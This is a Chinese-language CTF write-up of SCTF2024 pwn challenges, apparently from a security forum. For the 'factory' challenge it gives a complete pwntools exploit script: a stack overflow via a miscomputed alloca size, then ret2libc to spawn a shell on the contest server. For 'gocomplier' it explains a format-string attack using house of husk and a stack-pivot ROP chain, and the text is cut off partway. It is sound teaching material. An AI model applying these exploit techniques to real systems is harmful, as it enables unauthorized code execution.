---
title: XCTF分站赛SCTF2024Pwn方向题解
url: https://forum.butian.net/share/3910
source: 奇安信攻防社区
date: 2024-11-29
fetch_date: 2025-10-06T19:14:39.826622
---

# XCTF分站赛SCTF2024Pwn方向题解

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### XCTF分站赛SCTF2024Pwn方向题解

本文详细记录了笔者做SCTF2024Pwn方向题目的过程，希望对打Pwn的你有所启发

factory
=======
- 题目内容如下
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2bc6817321a90a3420f0d19cf6b26603f923456d.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-38dc9ce9a31d7963497c8670f49c9df53f6a19c7.png)
- 没细看根本没有看出来漏洞，好像就是输入n，然后用alloca来调整栈空间，把数据读到栈上，然后printf打印这些值的和
- 但是注意到一个很奇怪的地方 v0 = 0x10 \*((4\* n + 0x17) / 0x10uLL); 为什么v0不是8\\*n，64位条件下，栈应该是8字节对齐
- 计算发现一些问题
size不严格。因此n=0x28时，实际上应该时alloca(0x140)，但这样计算只有0xb0，因此有溢出
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-783b4e9756d20efd84e92e24378c25c775135b9f.png)
- 因此有如下利用思路
这里的栈溢出可以覆盖到buf和i的值
第一个思路是覆盖buf为一个任意地址，那么就可以任意地址写任意值，但是这里无法控制返回地址，所以放弃这个思路。
第二个思路就是这个覆盖会先覆盖到i的值，再覆盖到buf的值，所以可以覆盖i为一个特别的值，跳过对buf的覆盖，这样就可以通过栈溢出覆盖到返回地址，进而就行ret2libc就行,更具体地可以看exp中的注释
- exp
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
context(os='linux', arch='amd64', log\_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*0x4013D2')
p=remote('1.95.81.93',57777)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
#b \*$rebase(0x14F5)
def dbg():
gdb.attach(p,'b \*0x401402')
pause()
# dbg()
p.sendlineafter("How many factorys do you want to build: ",str(0x28))
for i in range(0x16):
p.sendlineafter(f"factory{i+1}",str(0x16))
#i
p.sendlineafter(f"factory{0x17}",str(0x1d-1))
#ret\_addr
pop\_rdi=0x401563
ret=0x000000000040101a
puts=0x4010B0
puts\_got=0x404018
vuln=0x401303
p.sendlineafter(f"factory{30}",str(pop\_rdi))
p.sendlineafter(f"factory{31}",str(puts\_got))
p.sendlineafter(f"factory{32}",str(puts))
p.sendlineafter(f"factory{33}",str(vuln))
for i in range(0x28-33):
p.sendlineafter(f"factory",str(0))
puts\_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libcbase = puts\_addr - libc.symbols['puts']
system\_addr = libcbase + libc.symbols['system']
bin\_addr = libcbase + next(libc.search(b'/bin/sh'))
for i in range(0x16):
p.sendlineafter(f"factory{i+1}",str(0x16))
#i
p.sendlineafter(f"factory{0x17}",str(0x1d-1))
#ret\_addr
p.sendlineafter(f"factory{30}",str(pop\_rdi))
p.sendlineafter(f"factory{31}",str(bin\_addr))
p.sendlineafter(f"factory{32}",str(ret))
p.sendlineafter(f"factory{33}",str(system\_addr))
for i in range(0x28-33):
p.sendlineafter(f"factory",str(0))
p.interactive()
```
gocomplier
==========
自己的解法
-----
这里是直接用的一个github项目进行的改编 <https://github.com/wa-lang/ugo>
µGo 是迷你Go语言玩具版本，只保留最基本的int数据类型、变量定义和函数、分支和循环等最基本的特性。µGo 有以下的关键字：var、func、if、for、return。此外有一个int内置的数据类型
先分析server.py这个文件，这样我们可以知道怎么进行的交互
```python
#! /usr/bin/python3
import os
import sys
import subprocess
from threading import Thread
from shutil import copy
import uuid
def socket\_print(string):
print("=====", string, flush=True)
def run\_challenge(filename):
socket\_print("start complete!")
try:
cmd = "./ir2bin.sh"
subprocess.run(cmd, shell=True, timeout=60)
except subprocess.CalledProcessError as e:
socket\_print("stopping")
clean\_file(filename)
pass
socket\_print("run binary")
try:
subprocess.run("./hello", shell=True, timeout=60)
except subprocess.CalledProcessError as e:
socket\_print("stopping")
clean\_file(filename)
pass
def get\_filename():
return "./tmp/{}".format(uuid.uuid4().hex)
def clean\_file(filename):
socket\_print("cleaning")
subprocess.run("rm -r ../../"+filename, shell=True, timeout=60)
def mkdir(path):
folder = os.path.exists(path)
if not folder:
os.makedirs(path)
else:
socket\_print("There is this folder!")
def input\_code(filename):
current\_directory = os.getcwd()
new\_directory = current\_directory + "/" + filename
os.chdir(new\_directory)
socket\_print("current: " + current\_directory)
socket\_print("new: " + new\_directory)
with open('./hello.ugo', 'w') as file:
print("input code: ")
print("\tinput \"end\" to stop")
while True:
line = input()
if line[:3] != "end":
file.write(line+"\n")
else:
break
def copy\_file(filename):
mkdir(filename)
copy("/home/ctf/ugo", filename+"/ugo")
copy("/home/ctf/hello.ugo", filename+"/hello.ugo")
copy("/home/ctf/ir2bin.sh", filename+"/ir2bin.sh")
def check(filename):
while True:
if sys.stdout.closed:
clean\_file(filename)
socket\_print("Cleaned up directory:")
def main():
#filename为./tmp/uuid.uuid4().hex 这种形式
filename = get\_filename()
print("Working path: "+filename)
Thread(target=check,args=filename)
#创建文件夹filename，再把ugo,hello.ugo,ir2bin.sh这个几个文件复制到这个Working path
copy\_file(filename)
#用户的输入会存到hello.ugo文件中，输入以end字符作为终止
input\_code(filename)
#运行ir2bin.sh，再运行./hello文件
run\_challenge(filename)
#清理Working path环境
clean\_file(filename)
if \_\_name\_\_ == "\_\_main\_\_":
main()
```
ir2bin.sh,直接运行ugo会把当前目录下hello.ugo变成hello.ll文件，ir2bin.sh就是把hello.ugo编译链接成一个可执行文件hello
```bash
#!/bin/sh
./ugo
llvm-as hello.ll -o hello.bc
llc hello.bc -o hello.s
as -o hello.o hello.s
gcc -no-pie -static hello.o -o hello
rm hello.bc hello.s hello.o
```
针对上述的分析，就知道是我们用户自己输入code然后被编译链接运行，如果能直接getshell，那么就打通了
那么最后就是分析ugo这个文件了，看看code有什么限制。在github\\_com\\_klang\\_ugo\\_parser\\_\\_ptr\\_Parser\\_parseFile函数中看到了限制
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-84c891287e147645165b3ad1767d2388f5220414.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-641705cc210e9786f8b05675125e858e9fc1eb3f.png)
只能使用printf和write函数，那么就可以想到是格式化字符串漏洞了，不过由于ir2bin.sh是静态链接，同时是no pie,所以这个格式化字符串很有意思，因为是利用静态链接里面的gadget，在函数运行的过程中利用格式化字符串覆盖自己函数的返回地址，而且途中用户是不可以进行输入的。
这里首先思考如何覆盖返回地址，虽然随便利用格式化字符串，但是有个问题。\*\*就是利用%p泄露出来的东西我们不像平时打格式化字符串那样可以交互，导致泄露了我们也无法存到变量中。\*\*
所以根本覆盖不了返回地址，只能想是否可以打其他的方式，比如exit函数等类似的ogg
最后想到是可以利用\*\*house of husk\*\*，因为有printf函数，只要覆盖\*\*printf\\_function\\_table不为0，覆盖\*\*printf\\_arginfo\\_table为一个地址，就可以执行\\_\\_printf\\_arginfo\\_table\[spec\]​的函数
但是这还不够，\*\*因为是静态链接的，没有像libc.so.6中有ogg可以用，所以必须ROP\*\*
显然这里要栈迁移了，常见的栈迁移利用方式是leave;ret或者setcontext，但是显然这里行不通，\*\*因为栈地址都无法泄露\*\*
这里思路就卡住了，卡了很久，最后想着随便找找和rsp相关的gadget，利用了如下指令 ROPgadget --binary hello | grep "add rsp.\\*"
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-b1b0fc266227465f086e223bcb1cf31593fa6d19.png)
可能有人会疑问为什么会找到这个\*\*add rsp, 0x1018 ; ret这个如此奇怪的gadget，这里是动调看出来的结果，发现每次执行house of husk那个链的时候，栈情况总是差main函数超过0x1000的偏移\*\*
这里我们就可以这样布置，先把ROP写到栈上，然后通过house of husk执行add rsp,0x1018;ret，然后执行栈上ROP，就可以getshell,这里格式化字符串也很折磨，\*\*因为不让连续出现两个%,否则ugo执行的时候就会报错\*\*，只能手动算有多少个a，然后输入
这里还有个地方要注意，\*\*专门定义了一个my\\_func()在main中调用，这也是动调的时候发现的\*\*，只有这样add rsp,0x1018;ret才能到正确的位置进行ROP，\*\*因为这里栈里面的偏移都是相对的，所以只能通过在main中调用另一个函数的方式来进行调整栈结构\*\*
可以看到这里\*\*printf\\_arginfo\\_table存的bss地址，bss\[spec\]存着add rsp,0x1018;ret地址\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-faaf26356e22b76a0456a1952cbd61024f647534.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-f9f946d5497aeb68b19c09f77f190b8c5b011842.png)
执行完add rsp,0x1018后，\*\*ret到的地址是个pop\\_rbx，实际上它是pop4 ;ret，通过pop调整rsp指向最后指向我们布置的ROP，最后getshell\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/...